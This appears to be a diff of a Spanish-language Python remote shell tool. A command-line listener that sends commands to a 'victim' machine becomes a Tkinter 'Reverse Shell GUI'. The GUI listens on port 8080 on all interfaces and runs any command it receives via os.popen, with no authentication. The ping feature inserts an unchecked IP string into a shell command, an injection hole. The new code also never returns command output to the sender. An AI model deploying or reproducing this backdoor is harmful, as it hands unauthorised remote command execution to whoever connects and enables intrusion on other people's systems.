@@ -1,65 +1,114 @@
-import socket, argparse, os, datetime
-from colorama import Fore, Style
-d = datetime.datetime.now()
-file = open('register.log', 'w')
-file.write(f'[+] Shell logs started at {d}\n')
-file.close()
-parser = argparse.ArgumentParser()
-parser.add_argument('--target', '-t', help="Indica la IP objetivo")
-parser.add_argument('--ping', '-p', help="Indica la IP a la que relizar el ping de verificación")
-args = parser.parse_args()
-def c():
-    if os.name=="nt":os.system("cls")
-    else:os.system("clear")
-class color:
-    RED=Style.BRIGHT+Fore.RED
-    WHITE=Style.BRIGHT+Fore.WHITE
-    RESET=Style.RESET_ALL+Fore.RESET
-def p():
-    c()
-    t='''
-███████╗██╗  ██╗███████╗██╗     ██╗  ██╗   ██╗
-██╔════╝██║  ██║██╔════╝██║     ██║  ╚██╗ ██╔╝
-███████╗███████║█████╗  ██║     ██║   ╚████╔╝ 
-╚════██║██╔══██║██╔══╝  ██║     ██║    ╚██╔╝  
-███████║██║  ██║███████╗███████╗███████╗██║   
-╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  
-'''
-    print(color.RED+t)
+import socket, os, requests, threading
+import tkinter as tk
+from PIL import Image, ImageTk
 
-if args.ping:
-    c()
+def clear_screen():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+def send_command(command):
     try:
-        if os.name=="nt":os.system(color.RED + f'ping -n 1 {args.ping}')
-        else:os.system(color.RED + f'ping -c 1 {args.ping}')
-        c()
-        p()
-        print(color.RED + '[*] Ping relizado con éxito, hay conectividad con la máquina víctima\n')
-    
-    except Exception as ex:
-        c()
-        p()
-        print(color.RED + '[*] No hay conectividad con la víctima. Error: ' + ex + '\n')
+        output = os.popen(command).read()
+        response_text.insert(tk.END, f'[*] Comando ejecutado: {command}\n', 'blue')
+        response_text.insert(tk.END, output + '\n', 'blue')
+    except Exception as e:
+        response_text.insert(tk.END, f'[*] Error al ejecutar el comando: {command}\n{str(e)}\n', 'red')
 
-elif args.target:
-    H=args.target
-    P=8080
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.bind((H,P))
+def send_command_from_entry():
+    command = command_entry.get()
+    if command:
+        send_command(command)
+        command_entry.delete(0, tk.END)
+
+def ping_target():
+    try:
+        if target_ip:
+            if os.name == 'nt':
+                ping_response = os.popen(f'ping -n 1 {target_ip}').read()
+                response_text.insert(tk.END, ping_response + '\n', 'blue')  
+            else:
+                ping_response = os.popen(f'ping -c 1 {target_ip}').read()
+                response_text.insert(tk.END, ping_response + '\n', 'blue')  
+        else:
+            response_text.insert(tk.END, '[*] Por favor, ingrese una IP objetivo primero.\n', 'red')
+    except Exception as e:
+        response_text.insert(tk.END, f'[*] Error al realizar el ping: {str(e)}\n', 'red') 
+
+def check_internet_connection():
+    try:
+        g = requests.get('https://www.google.com/')
+        status_code = g.status_code
+        if status_code == 200:
+            response_text.insert(tk.END, '[*] Hay conexión a internet\n', 'blue') 
+        else:
+            response_text.insert(tk.END, '[*] No hay conexión a internet\n', 'blue') 
+    except Exception as e:
+        response_text.insert(tk.END, f'[*] Error al verificar la conexión a internet: {str(e)}\n', 'red') 
+
+def accept_connections():
+    H = '0.0.0.0'
+    P = 8080
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((H, P))
     s.listen(1)
-    p()
-    print(color.WHITE+f'[*] Escuchando conexiones en {H}:{P}')
-    n,a=s.accept()
-    print(color.WHITE+f'[+] Conexión entrante: {a[0]}:{a[1]}')
+    response_text.insert(tk.END, f'[*] Escuchando conexiones en {H}:{P}\n', 'blue')  
+    n, a = s.accept()
+    response_text.insert(tk.END, f'[+] Conexión entrante: {a[0]}:{a[1]}\n', 'blue')  
     while True:
-        e=input(color.WHITE+f'shelly@{P}:~$ ')
-        n.send(e.encode())
-        if e.strip()=='exit':break
-        o = n.recv(1024).decode()
-        print(color.WHITE+o)
+        command = n.recv(1024).decode()
+        if not command:
+            break
+        response_text.insert(tk.END, f'[*] Comando recibido: {command}\n', 'blue')  
+        send_command(command)
     n.close()
 
-else:
-    c()
-    p()
-    print(color.WHITE + '[*] Error: No argument found\n' + color.RESET)
+def save_target_ip():
+    global target_ip
+    target_ip = target_entry.get()
+    response_text.insert(tk.END, f'[*] IP objetivo guardada: {target_ip}\n', 'blue') 
+
+root = tk.Tk()
+root.title("Reverse Shell GUI")
+root.geometry("700x400")
+
+icon_image = Image.open("shell.png")
+icon_photo = ImageTk.PhotoImage(icon_image)
+root.iconphoto(True, icon_photo)
+
+input_frame = tk.Frame(root)
+input_frame.pack(pady=10, padx=10, fill=tk.X)
+
+target_entry_label = tk.Label(input_frame, text="IP Objetivo:", font=("Consolas", 12))
+target_entry_label.grid(row=0, column=0, padx=(0, 10))
+
+target_entry = tk.Entry(input_frame, width=30, font=("Consolas", 12))
+target_entry.grid(row=0, column=1)
+
+save_ip_button = tk.Button(input_frame, text="Guardar", font=("Consolas", 12), command=save_target_ip)
+save_ip_button.grid(row=0, column=2, padx=(10, 0))
+
+command_entry = tk.Entry(root, width=70, font=("Consolas", 12))
+command_entry.pack(pady=(5, 5), padx=10)
+
+button_frame = tk.Frame(root)
+button_frame.pack(pady=5)
+
+send_button = tk.Button(button_frame, text="Send Command", font=("Consolas", 12), command=send_command_from_entry)
+send_button.pack(side=tk.LEFT, padx=5)
+
+ping_button = tk.Button(button_frame, text="Ping", font=("Consolas", 12), command=ping_target)
+ping_button.pack(side=tk.LEFT, padx=5)
+
+internet_button = tk.Button(button_frame, text="Check Internet", font=("Consolas", 12), command=check_internet_connection)
+internet_button.pack(side=tk.LEFT, padx=5)
+
+response_text = tk.Text(root, font=("Consolas", 12))
+response_text.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)
+
+threading.Thread(target=accept_connections, daemon=True).start()
+
+response_text.tag_configure('blue', foreground='blue')
+
+root.mainloop()
